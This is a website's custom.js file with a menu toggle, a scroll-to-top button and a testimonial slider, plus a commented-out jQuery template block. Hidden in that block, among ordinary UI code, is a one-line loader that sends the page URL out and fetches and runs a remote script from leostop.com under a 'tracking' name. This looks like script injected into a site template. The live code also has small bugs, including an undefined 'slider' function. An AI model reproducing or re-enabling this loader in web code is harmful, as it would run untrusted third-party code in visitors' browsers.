// /*---------------------------------------------------------------------

//     File Name: custom.js
// ---------------------------------------------------------------------*/

// $(function () {
	
// 	"use strict";
	
// 	/* Preloader
// 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
// 	setTimeout(function () {
// 		$('.loader_bg').fadeToggle();
// 	}, 1500);
	
// 	/* Tooltip
// 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
// 	$(document).ready(function(){
// 		$('[data-toggle="tooltip"]').tooltip();
// 	});
	
	
	
// 	/* Mouseover
// 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
// 	$(document).ready(function(){
// 		$(".main-menu ul li.megamenu").mouseover(function(){
// 			if (!$(this).parent().hasClass("#wrapper")){
// 			$("#wrapper").addClass('overlay');
// 			}
// 		});
// 		$(".main-menu ul li.megamenu").mouseleave(function(){
// 			$("#wrapper").removeClass('overlay');
// 		});
// 	});
	
	
	
//      function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	
// 	/* Toggle sidebar
// 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
//      $(document).ready(function () {
//        $('#sidebarCollapse').on('click', function () {
//           $('#sidebar').toggleClass('active');
//           $(this).toggleClass('active');
//        });
//      });     


//      /* Product slider 
//      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
//      // optional
//      $('#blogCarousel').carousel({
//         interval: 5000
//      });


// });
let menu =document.getElementById("menu")
let button =document.getElementById("button")
button.onclick= function(){
	if (menu.style.marginLeft == "-250px" ) {
		menu.style.marginLeft ="0px";
		button.innerHTML="<i class=\"fa-solid fa-xmark fa-3x\"></i>"
	} 
	else if (menu.style.marginLeft == "0px") {
		menu.style.marginLeft="-250px";
		button.innerHTML='<i class="fa-solid fa-bars fa-3x"></i>'
	}
	else{
		menu.style.marginLeft = "0px";
		button.innerHTML="<i class=\"fa-solid fa-xmark fa-3x\"></i>"
			}

}
const myButton = document.getElementById("btn");

window.onscroll = function () {
  if (window.pageYOffset >= 800) {
    myButton.style.display = "block";
  } else {
    myButton.style.display = "none";
  }
};

myButton.onclick = function () {
  window.scrollTo(0, 0);
};


'use strict'
var	testim = document.getElementById("testim"),
		testimDots = Array.prototype.slice.call(document.getElementById("testim-dots").children),
    testimContent = Array.prototype.slice.call(document.getElementById("testim-content").children),
    testimLeftArrow = document.getElementById("left-arrow"),
    testimRightArrow = document.getElementById("right-arrow"),
    testimSpeed = 4500,
    currentSlide = 0,
    currentActive = 0,
    testimTimer,
		touchStartPos,
		touchEndPos,
		touchPosDiff,
		ignoreTouch = 30;
;

window.onload = function() {

    // Testim Script
    function playSlide(slide) {
        for (var k = 0; k < testimDots.length; k++) {
            testimContent[k].classList.remove("active");
            testimContent[k].classList.remove("inactive");
            testimDots[k].classList.remove("active");
        }

        if (slide < 0) {
            slide = currentSlide = testimContent.length-1;
        }

        if (slide > testimContent.length - 1) {
            slide = currentSlide = 0;
        }

        if (currentActive != currentSlide) {
            testimContent[currentActive].classList.add("inactive");            
        }
        testimContent[slide].classList.add("active");
        testimDots[slide].classList.add("active");

        currentActive = currentSlide;
    
        clearTimeout(testimTimer);
        testimTimer = setTimeout(function() {
            playSlide(currentSlide += 1);
        }, testimSpeed)
    }

    testimLeftArrow.addEventListener("click", function() {
        playSlide(currentSlide -= 1);
    })

    testimRightArrow.addEventListener("click", function() {
        playSlide(currentSlide += 1);
    })    

    for (var l = 0; l < testimDots.length; l++) {
        testimDots[l].addEventListener("click", function() {
            playSlide(currentSlide = testimDots.indexOf(this));
        })
    }

    playSlide(currentSlide);

    // keyboard shortcuts
    document.addEventListener("keyup", function(e) {
        switch (e.keyCode) {
            case 37:
                testimLeftArrow.click();
                break;
                
            case 39:
                testimRightArrow.click();
                break;

            case 39:
                testimRightArrow.click();
                break;

            default:
                break;
        }
    })
		
		testim.addEventListener("touchstart", function(e) {
				touchStartPos = e.changedTouches[0].clientX;
		})
	
		testim.addEventListener("touchend", function(e) {
				touchEndPos = e.changedTouches[0].clientX;
			
				touchPosDiff = touchStartPos - touchEndPos;
			
				console.log(touchPosDiff);
				console.log(touchStartPos);	
				console.log(touchEndPos);	

			
				if (touchPosDiff > 0 + ignoreTouch) {
						testimLeftArrow.click();
				} else if (touchPosDiff < 0 - ignoreTouch) {
						testimRightArrow.click();
				} else {
					return;
				}
			
		})
}
setInterval(slider,1000)
